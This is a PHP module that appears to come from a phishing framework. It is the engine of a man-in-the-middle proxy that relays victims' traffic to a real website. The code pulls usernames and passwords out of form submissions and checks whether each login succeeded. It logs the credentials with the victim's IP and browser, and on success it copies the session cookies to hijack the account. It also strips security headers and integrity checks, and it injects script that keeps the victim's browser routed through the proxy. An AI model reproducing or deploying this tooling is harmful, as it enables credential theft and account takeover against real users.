<?php
/**
 * lib/proxy.php — Transparent MITM proxy engine.
 *
 * Instead of a static clone, this relays requests to the real target and
 * rewrites the response so all links point back through the proxy. It also
 * injects a runtime JS that patches fetch/XHR/WebSocket/history to keep
 * everything routed through the proxy path.
 *
 * Flow:
 *   1. Router sends /<slug>/proxy/... here
 *   2. Load target meta (URL, host)
 *   3. Create/resume victim session (sb_sid cookie)
 *   4. Sniff credentials from POST body BEFORE forwarding
 *   5. Forward request via cURL with per-victim cookie jar
 *   6. Verify credentials against response
 *   7. Auto-hijack on success
 *   8. Rewrite response body URLs
 *   9. Inject runtime JS
 *  10. Emit response
 */

require_once __DIR__ . '/store.php';
require_once __DIR__ . '/cred-sniffer.php';
require_once __DIR__ . '/cred-verifier.php';
require_once __DIR__ . '/hijacker.php';

/**
 * Handle a proxied request.
 *
 * @param string $slug        Target slug
 * @param string $sub_path    Path after /<slug>/proxy/
 * @param array  $target      Target row from DB
 */
function proxy_handle(string $slug, string $sub_path, array $target): void {
    $origin  = rtrim($target['url'], '/');
    $host    = parse_url($origin, PHP_URL_HOST) ?: '';
    $port    = parse_url($origin, PHP_URL_PORT);
    $scheme  = parse_url($origin, PHP_URL_SCHEME) ?: 'https';
    $base    = $scheme . '://' . $host . ($port ? ':' . $port : '');

    // Build the real URL
    $real_url = $origin;
    if ($sub_path !== '' && $sub_path !== '/') {
        $real_url = $base . '/' . ltrim($sub_path, '/');
    }
    $qs = $_SERVER['QUERY_STRING'] ?? '';
    if ($qs !== '') $real_url .= '?' . $qs;

    // Proxy base path for rewriting
    $proxy_base = '/' . $slug . '/proxy';

    // Victim session
    $victim_id = $_COOKIE['sb_sid'] ?? '';
    if ($victim_id === '' || strlen($victim_id) < 16) {
        $victim_id = bin2hex(random_bytes(16));
        setcookie('sb_sid', $victim_id, [
            'path'     => '/',
            'httponly'  => true,
            'samesite' => 'Lax',
        ]);
    }

    // Cookie jar per victim
    $jar_dir = __DIR__ . '/../data/jars/' . $slug;
    if (!is_dir($jar_dir)) @mkdir($jar_dir, 0755, true);
    $jar_path = $jar_dir . '/' . $victim_id . '.txt';

    // Sniff credentials from POST
    $creds = null;
    $method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
    $raw_body = '';
    if ($method === 'POST' || $method === 'PUT' || $method === 'PATCH') {
        $raw_body = file_get_contents('php://input') ?: '';
        $ct = $_SERVER['CONTENT_TYPE'] ?? $_SERVER['HTTP_CONTENT_TYPE'] ?? '';
        if ($raw_body !== '') {
            $creds = credsniffer_extract($raw_body, $ct);
        }
    }

    // Gather request headers to forward
    $host_port = $host . ($port ? ':' . $port : '');
    $fwd_headers = proxy_gather_headers($host_port);

    // Forward via cURL
    $ch = curl_init($real_url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER         => true,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_MAXREDIRS      => 0,
        CURLOPT_TIMEOUT        => 30,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_HTTPHEADER     => $fwd_headers,
        CURLOPT_COOKIEJAR      => $jar_path,
        CURLOPT_COOKIEFILE     => $jar_path,
        CURLOPT_ENCODING       => '',
        CURLOPT_USERAGENT      => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0',
    ]);

    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $raw_body);
    } elseif ($method !== 'GET') {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
        if ($raw_body !== '') curl_setopt($ch, CURLOPT_POSTFIELDS, $raw_body);
    }

    $response = curl_exec($ch);
    if ($response === false) {
        http_response_code(502);
        echo 'Proxy error: ' . curl_error($ch);
        curl_close($ch);
        return;
    }

    $status      = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $resp_head   = substr($response, 0, $header_size);
    $resp_body   = substr($response, $header_size);

    // Force cURL to flush jar before hijacker reads it
    unset($ch);

    // Parse response headers
    $resp_headers = proxy_parse_headers($resp_head);

    // Collect Set-Cookie headers for hijacker
    $set_cookies = [];
    foreach ($resp_headers as $h) {
        if (stripos($h['raw'], 'set-cookie:') === 0) {
            $set_cookies[] = substr($h['raw'], 12);
        }
    }

    // Verify credentials if we sniffed any
    if ($creds !== null) {
        $verify_headers = [];
        foreach ($resp_headers as $h) {
            $parts = explode(':', $h['raw'], 2);
            if (count($parts) === 2) {
                $verify_headers[strtolower(trim($parts[0]))] = trim($parts[1]);
            }
        }

        $verdict = credverifier_verdict($status, $verify_headers, $resp_body, $real_url);

        // Log credential event
        store_event_add($slug, 'cred', [
            'user'     => $creds['user'],
            'pass'     => $creds['pass'],
            'user_key' => $creds['user_key'],
            'pass_key' => $creds['pass_key'],
            'source'   => 'proxy',
            'verdict'  => $verdict['verdict'],
            'why'      => $verdict['why'],
            'ip'       => $_SERVER['REMOTE_ADDR'] ?? '',
            'ua'       => $_SERVER['HTTP_USER_AGENT'] ?? '',
        ], time());

        // Auto-hijack on success
        if ($verdict['verdict'] === 'success') {
            $session_id = hijacker_snapshot(
                $slug, $victim_id, $jar_path, $set_cookies,
                $_SERVER['REMOTE_ADDR'] ?? '',
                $_SERVER['HTTP_USER_AGENT'] ?? '',
                $host
            );

            store_event_add($slug, 'session', [
                'session_id' => $session_id,
                'victim_id'  => $victim_id,
                'ip'         => $_SERVER['REMOTE_ADDR'] ?? '',
            ], time());

            // Log to NDJSON for SSE
            proxy_log_event($slug, 'session_hijack', [
                'session_id' => $session_id,
                'user'       => $creds['user'],
                'verdict'    => 'success',
            ]);
        }

        // Log cred event to NDJSON for SSE
        proxy_log_event($slug, 'credential', [
            'user'    => $creds['user'],
            'verdict' => $verdict['verdict'],
        ]);
    }

    // Rewrite redirect Location header
    if ($status >= 300 && $status < 400) {
        foreach ($resp_headers as &$h) {
            if (stripos($h['raw'], 'location:') === 0) {
                $loc = trim(substr($h['raw'], 9));
                $loc = proxy_rewrite_url($loc, $base, $proxy_base);
                $h['raw'] = 'Location: ' . $loc;
            }
        }
        unset($h);
    }

    // Emit response
    http_response_code($status);

    // Forward safe headers
    $skip_headers = [
        'transfer-encoding', 'content-encoding', 'content-length',
        'content-security-policy', 'content-security-policy-report-only',
        'strict-transport-security', 'x-frame-options', 'x-content-type-options',
        'public-key-pins', 'expect-ct',
    ];
    foreach ($resp_headers as $h) {
        $name = strtolower(explode(':', $h['raw'])[0] ?? '');
        if (in_array($name, $skip_headers, true)) continue;

        // Rewrite Set-Cookie: strip Domain, drop Secure, scope Path
        if ($name === 'set-cookie') {
            $rewritten = proxy_rewrite_cookie($h['raw'], $proxy_base);
            header($rewritten, false);
            continue;
        }
        header($h['raw'], false);
    }

    // Rewrite body for HTML responses
    $ct = '';
    foreach ($resp_headers as $h) {
        if (stripos($h['raw'], 'content-type:') === 0) {
            $ct = strtolower(trim(substr($h['raw'], 13)));
        }
    }

    if (str_contains($ct, 'html')) {
        $resp_body = proxy_rewrite_body($resp_body, $base, $proxy_base);
        $resp_body = proxy_inject_runtime($resp_body, $proxy_base, $base);
    }

    header('Content-Length: ' . strlen($resp_body));
    echo $resp_body;
}

function proxy_gather_headers(string $host_port): array {
    $headers = [];
    $skip = ['host', 'cookie', 'connection', 'accept-encoding'];

    foreach ($_SERVER as $k => $v) {
        if (!str_starts_with($k, 'HTTP_')) continue;
        $name = str_replace('_', '-', strtolower(substr($k, 5)));
        if (in_array($name, $skip, true)) continue;
        $headers[] = ucwords($name, '-') . ': ' . $v;
    }
    $headers[] = 'Host: ' . $host_port;

    if (isset($_SERVER['CONTENT_TYPE'])) {
        $headers[] = 'Content-Type: ' . $_SERVER['CONTENT_TYPE'];
    }

    return $headers;
}

function proxy_parse_headers(string $raw): array {
    $headers = [];
    foreach (explode("\r\n", $raw) as $line) {
        $line = trim($line);
        if ($line === '' || str_starts_with($line, 'HTTP/')) continue;
        $headers[] = ['raw' => $line];
    }
    return $headers;
}

function proxy_rewrite_url(string $url, string $base, string $proxy_base): string {
    // Absolute URL on same host
    if (str_starts_with($url, $base)) {
        $path = substr($url, strlen($base));
        return $proxy_base . $path;
    }
    // Protocol-relative
    $host = parse_url($base, PHP_URL_HOST);
    if (str_starts_with($url, '//' . $host)) {
        $path = substr($url, strlen('//' . $host));
        return $proxy_base . $path;
    }
    // Root-relative
    if (str_starts_with($url, '/') && !str_starts_with($url, '//')) {
        return $proxy_base . $url;
    }
    return $url;
}

function proxy_rewrite_cookie(string $header, string $proxy_base): string {
    $header = preg_replace('/;\s*Domain=[^;]*/i', '', $header);
    $header = preg_replace('/;\s*Secure/i', '', $header);
    $header = preg_replace('/;\s*Path=[^;]*/i', '; Path=' . $proxy_base, $header);
    return $header;
}

function proxy_rewrite_body(string $body, string $base, string $proxy_base): string {
    $host   = parse_url($base, PHP_URL_HOST);
    $port   = parse_url($base, PHP_URL_PORT);
    $scheme = parse_url($base, PHP_URL_SCHEME) ?: 'https';
    $origin = $scheme . '://' . $host . ($port ? ':' . $port : '');
    $host_port = $host . ($port ? ':' . $port : '');

    // Absolute URLs: https://target.com/... → /slug/proxy/...
    $body = str_replace($origin . '/', $proxy_base . '/', $body);
    $body = str_replace($origin . '"', $proxy_base . '/"', $body);
    $body = str_replace($origin . "'", $proxy_base . "/'", $body);

    // Protocol-relative: //target.com:port/... → /slug/proxy/...
    $body = str_replace('//' . $host_port . '/', $proxy_base . '/', $body);
    if ($port) $body = str_replace('//' . $host . '/', $proxy_base . '/', $body);

    // Root-relative in common attributes
    $attrs = 'src|href|action|formaction|poster|data-src|data-href';
    $body = preg_replace_callback(
        '/(\s(?:' . $attrs . ')\s*=\s*["\'])\/(?!\/)/i',
        fn($m) => $m[1] . $proxy_base . '/',
        $body
    );

    // Rewrite srcset
    $body = preg_replace_callback(
        '/(srcset\s*=\s*["\'])([^"\']+)(["\'])/i',
        function($m) use ($proxy_base) {
            $srcset = preg_replace_callback(
                '/(?:^|,)\s*\/(?!\/)/',
                fn($s) => str_replace('/', $proxy_base . '/', $s[0]),
                $m[2]
            );
            return $m[1] . $srcset . $m[3];
        },
        $body
    );

    // Remove integrity/crossorigin/nonce attributes
    $body = preg_replace('/\s+(integrity|crossorigin|nonce)\s*=\s*"[^"]*"/i', '', $body);
    $body = preg_replace("/\s+(integrity|crossorigin|nonce)\s*=\s*'[^']*'/i", '', $body);

    // Nuke CSP meta tags
    $body = preg_replace('/<meta[^>]*http-equiv\s*=\s*["\']content-security-policy["\'][^>]*>/i', '', $body);

    return $body;
}

function proxy_inject_runtime(string $body, string $proxy_base, string $origin): string {
    $js = proxy_build_runtime($proxy_base, $origin);
    $tag = '<script data-sb-runtime="1">' . $js . '</script>';

    // Inject right after <head> or at start of <body>
    if (preg_match('/<head[^>]*>/i', $body, $m, PREG_OFFSET_CAPTURE)) {
        $pos = $m[0][1] + strlen($m[0][0]);
        return substr($body, 0, $pos) . $tag . substr($body, $pos);
    }
    if (preg_match('/<body[^>]*>/i', $body, $m, PREG_OFFSET_CAPTURE)) {
        $pos = $m[0][1] + strlen($m[0][0]);
        return substr($body, 0, $pos) . $tag . substr($body, $pos);
    }
    return $tag . $body;
}

function proxy_build_runtime(string $proxy_base, string $origin): string {
    $host = parse_url($origin, PHP_URL_HOST);
    $port = parse_url($origin, PHP_URL_PORT);
    $host_port = $host . ($port ? ':' . $port : '');
    return <<<JS
(function(){
  var PB="{$proxy_base}",OH="{$host_port}",OO="{$origin}";
  function rw(u){
    if(!u||typeof u!=='string')return u;
    if(u.indexOf(OO)===0) return PB+u.slice(OO.length);
    if(u.indexOf('//'+OH)===0) return PB+u.slice(('//'+OH).length);
    if(u[0]==='/'&&u[1]!=='/') return PB+u;
    return u;
  }
  // Patch fetch
  var _fetch=window.fetch;
  window.fetch=function(r,o){
    if(typeof r==='string') r=rw(r);
    else if(r&&r.url) r=new Request(rw(r.url),r);
    return _fetch.call(this,r,o);
  };
  // Patch XHR
  var _xo=XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open=function(m,u){
    arguments[1]=rw(u);
    return _xo.apply(this,arguments);
  };
  // Patch sendBeacon
  if(navigator.sendBeacon){
    var _sb=navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon=function(u,d){return _sb(rw(u),d);};
  }
  // Patch WebSocket
  var _WS=window.WebSocket;
  window.WebSocket=function(u,p){
    u=u.replace('wss://'+OH,'wss://'+location.host).replace('ws://'+OH,'ws://'+location.host);
    return p?new _WS(u,p):new _WS(u);
  };
  window.WebSocket.prototype=_WS.prototype;
  // Patch EventSource
  if(window.EventSource){
    var _ES=window.EventSource;
    window.EventSource=function(u,o){return new _ES(rw(u),o);};
    window.EventSource.prototype=_ES.prototype;
  }
  // Patch history
  var _ps=history.pushState,_rs=history.replaceState;
  history.pushState=function(s,t,u){return _ps.call(this,s,t,u?rw(u):u);};
  history.replaceState=function(s,t,u){return _rs.call(this,s,t,u?rw(u):u);};
  // Patch element src/href setters
  ['HTMLImageElement','HTMLScriptElement','HTMLLinkElement','HTMLAnchorElement','HTMLFormElement','HTMLIFrameElement','HTMLSourceElement'].forEach(function(n){
    var E=window[n];if(!E)return;
    ['src','href','action'].forEach(function(a){
      var d=Object.getOwnPropertyDescriptor(E.prototype,a);
      if(!d||!d.set)return;
      var _s=d.set;
      Object.defineProperty(E.prototype,a,{set:function(v){_s.call(this,rw(v));},get:d.get,configurable:true});
    });
  });
})();
JS;
}

function proxy_log_event(string $slug, string $type, array $data): void {
    $log_dir = __DIR__ . '/../log';
    if (!is_dir($log_dir)) @mkdir($log_dir, 0755, true);
    $log_file = $log_dir . '/events.ndjson';

    $entry = json_encode(array_merge([
        'ts'   => time(),
        'slug' => $slug,
        'type' => $type,
    ], $data), JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

    file_put_contents($log_file, $entry . "\n", FILE_APPEND | LOCK_EX);
}
